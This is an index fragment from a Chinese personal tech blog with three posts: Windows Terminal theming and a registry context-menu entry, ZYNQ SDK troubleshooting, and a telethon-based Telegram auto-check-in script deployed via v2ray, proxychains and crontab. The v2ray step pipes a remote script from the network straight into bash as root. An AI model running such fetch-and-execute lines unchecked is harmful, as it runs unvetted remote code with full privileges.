      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows Terminal主题设置及右键菜单</title>
    <link href="/2020/08/01/Windows%20Terminal%E4%B8%BB%E9%A2%98%E8%AE%BE%E7%BD%AE%E5%8F%8A%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/"/>
    <url>/2020/08/01/Windows%20Terminal%E4%B8%BB%E9%A2%98%E8%AE%BE%E7%BD%AE%E5%8F%8A%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-配置主题">0x01 配置主题</h3><p>打开Windows Terminal，或者按<code>Win+R</code>输入<code>wt</code>打开终端程序。</p><p>点击Windows terminal中的下拉箭头选择设置，打开配置Windows Terminal的Json文件。</p><p><img src="https://img-blog.csdnimg.cn/20200602212434430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ3MzgzOTkx,size_16,color_FFFFFF,t_70" alt></p><p>打开网站*<a href="https://atomcorp.github.io/themes/*%EF%BC%8C%E5%A4%8D%E5%88%B6%E4%B8%80%E4%B8%AA%E4%B8%BB%E9%A2%98%EF%BC%8C%E5%B0%86%E5%A4%8D%E5%88%B6%E7%9A%84%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E7%B2%98%E8%B4%B4%E5%88%B0schemes%E9%87%8C%E9%9D%A2%E3%80%82">https://atomcorp.github.io/themes/*，复制一个主题，将复制的主题代码粘贴到schemes里面。</a></p><p><img src="https://img-blog.csdnimg.cn/20200602212541173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ3MzgzOTkx,size_16,color_FFFFFF,t_70" alt></p><p>在list中分别配置PowerShell的主题和cmd的主题，添加如下代码即可应用对应的主题。</p><p><code>&quot;colorScheme&quot;:&quot;WarmNeon&quot;</code></p><p><img src="https://img-blog.csdnimg.cn/20200602212757812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ3MzgzOTkx,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x02-设置右键菜单打开">0x02 设置右键菜单打开</h3><p>打开注册表<code>regedit</code>，进入路径<code>HKEY_CLASSES_ROOT\Directory\Background\shell</code>，右键<code>shell</code>新增<code>Windows Shell</code>项，并添加如下图所示的值：</p><p><img src="https://img-blog.csdnimg.cn/20200603103113272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ3MzgzOTkx,size_16,color_FFFFFF,t_70" alt="Extended项存在时表示shift+右键才会启动，如不需要删除即可"></p><p>在<code>Windows Terminal</code>上新建<code>command</code>项，修改默认值为：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\xxxx\AppData\Local\Microsoft\WindowsApps\wt.exe<br></code></pre></td></tr></table></figure><h3 id="0x03-参考">0x03 参考</h3><p><a href="https://blog.csdn.net/m0_47383991/article/details/106499585">https://blog.csdn.net/m0_47383991/article/details/106499585</a></p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows Terminal</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZYNQ学习遇到的一些坑</title>
    <link href="/2020/04/19/ZYNQ%E5%AD%A6%E4%B9%A0%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <url>/2020/04/19/ZYNQ%E5%AD%A6%E4%B9%A0%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>毕设做的是和ZYNQ相关，因为之前没有接触过，所以初次学习的时候未免遇到许多坑，暂且记录下来。</p><h3 id="0x01-坑">0x01 坑</h3><h4 id="1-用开发板进行SDK测试时遇到的问题，硬件调试会弹窗">1. 用开发板进行SDK测试时遇到的问题，硬件调试会弹窗</h4><p><img src="https://forums.xilinx.com/xlnx/attachments/xlnx/EmbBoot/1682/1/Prob.JPG" alt="Prob.JPG"></p><p><em>解决方法：用JTAG模式启动；检查你插没插UART线（没错就是我）；查看硬件设计里UART接口是否选择（还是我）</em></p><h3 id="2、SDK开发SD卡读写功能时，调用xilffs库会提示undefined-reference问题">2、SDK开发SD卡读写功能时，调用xilffs库会提示undefined reference问题</h3><p><em>解决方法：选择sdk工程对应的bsp工程，右键board package setting，取消勾选xilffs，之后clean project，再勾选上xilffs后重新编译工程；检查你硬件是否选了SD卡接口（我之前以为SDK的出现的问题与硬件无关，就一直没在vivado硬件设计中寻找原因，浪费了好长时间）</em></p><h3 id="3、SDK编译提示make-Interrupt-Exception-caught-code-0xc0000005-addr-0x0040FCE4">3、SDK编译提示make: Interrupt/Exception caught (code = 0xc0000005, addr = 0x0040FCE4)</h3><p>这个问题出现的相当隐蔽。问题发生的时候，elf文件始终生成不出，导致解决方向偏离了。一翻日志才发现是make编译器的锅，并且这个错误信息还是用平常字体显示的，这就更难找了。</p><p><em>解决方法：卸载掉你电脑里的Git、NodeJs等自带make的程序，并在系统变量里删除</em></p><h3 id="4、SDK调试用putty连接端口不显示信息或提示端口占用">4、SDK调试用putty连接端口不显示信息或提示端口占用</h3><p><em>解决方法：确保端口是silicon_labscp210x Cp210所在端口，如果没有该驱动请安装一个</em></p><h3 id="0x02-后记">0x02 后记</h3><p>感谢meta司机和某不知名群里的热心群友大哥提供的思路和帮助，很感谢。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>此处有坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>Vivado</tag>
      
      <tag>ZYNQ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python实现Telegram自动签到脚本</title>
    <link href="/2020/04/07/Python%E5%AE%9E%E7%8E%B0Telegram%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/"/>
    <url>/2020/04/07/Python%E5%AE%9E%E7%8E%B0Telegram%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>Telegram上有很多需要每天签到的东西，利用脚本和服务器可以实现自动化签到。</p><h3 id="0x01-步骤">0x01 步骤</h3><ol><li>在 <a href="https://my.telegram.org/auth">https://my.telegram.org/auth</a> 申请API，需要 <code>api_id</code>与<code>api_hash</code></li><li>编写脚本，需要签到的公众号和指定命令与上步得到的 <code>api_id</code>与<code>api_hash</code></li><li>部署在服务器，利用crontab进行自动化签到</li></ol><h3 id="0x02-脚本">0x02 脚本</h3><p>此处以t00ls的签到为例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> telethon <span class="hljs-keyword">import</span> TelegramClient, events, sync<br><br><span class="hljs-comment">#填写自己的api信息</span><br>api_id = your_api_id <br>api_hash = <span class="hljs-string">&#x27;your_api_hash&#x27;</span> <br><br>client = TelegramClient(<span class="hljs-string">&#x27;t00ls_sign&#x27;</span>, api_id, api_hash)<br>client.start()<br><br>client.send_message(<span class="hljs-string">&#x27;T00lsBot&#x27;</span>, <span class="hljs-string">&#x27;/start&#x27;</span>)<br><br><span class="hljs-meta">@client.on(<span class="hljs-params">events.NewMessage(<span class="hljs-params">chats=(<span class="hljs-params"><span class="hljs-string">&#x27;T00lsBot&#x27;</span></span>)</span>)</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>):<br>    <span class="hljs-keyword">await</span> event.click(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]T00ls已执行签到.&quot;</span>)<br>    <span class="hljs-keyword">if</span>(event.text[:<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;尊敬的&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]成功签到.&quot;</span>)<br>        <span class="hljs-keyword">await</span> client.disconnect()<br>    <span class="hljs-keyword">elif</span>(<span class="hljs-string">&quot;签过到&quot;</span> <span class="hljs-keyword">in</span> event.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!]T00ls今天已经签过到了.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!]T00ls签到异常.&quot;</span>)<br><br><span class="hljs-keyword">with</span> client:<br>    client.add_event_handler(handler)<br>    client.disconnected<br>    <span class="hljs-comment">#client.run_until_disconnected() </span><br></code></pre></td></tr></table></figure><p>脚本运行后会出现连接错误的提示，是因为国内把Telegram墙掉了，可以开代理运行脚本即可。运行成功后会提示输入手机号和验证码，输入一次以后就可以不用输入了。</p><h3 id="0x03-部署">0x03 部署</h3><p>因为Telegram在国内被墙，如果直接将脚本部署到国内云上会出现连接错误的提示。我使用了v2ray + proxychains + crontab的形式来实现脚本自动执行。</p><h5 id="1、V2ray的安装">1、V2ray的安装</h5><p>在线安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br>bash &lt;(curl -L -s https://install.direct/go.sh)<br></code></pre></td></tr></table></figure><p>进<code>/etc/v2ray/config.json</code>配置梯子，或者使用<code>V2rayN</code>导入节点后导出json文件，在复制粘贴进来。</p><p>之后就是开启v2ray服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 v2ray 进程状态</span><br>systemctl status v2ray<br><br><span class="hljs-comment"># 启动</span><br>systemctl start v2ray<br><br><span class="hljs-comment"># 重启</span><br>systemctl restart v2ray<br></code></pre></td></tr></table></figure><h5 id="2、Proxychians的安装">2、Proxychians的安装</h5><p>安装下载源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng<br></code></pre></td></tr></table></figure><p>编译和安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> proxychains-ng<br>./configure --prefix=/usr --sysconfdir=/etc<br>make <br>make install<br>make install-config<br><span class="hljs-built_in">cd</span> .. &amp;&amp; <span class="hljs-built_in">rm</span> -rf proxychains-ng<br></code></pre></td></tr></table></figure><p>在<code>/etc/proxychains.conf</code>里配置，<code>[ProxyList]</code>下添加：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>不要忘了在服务器控制台防火墙放行1080端口。</p><h5 id="3、运行">3、运行</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychians4 <span class="hljs-keyword">python</span> auto_signup.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>将上面的命令写入crontab规则，规则列表在<code>/etc/crontab</code>，里面有详细说明，在此不表。</p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Telegram</tag>
      
      <tag>脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
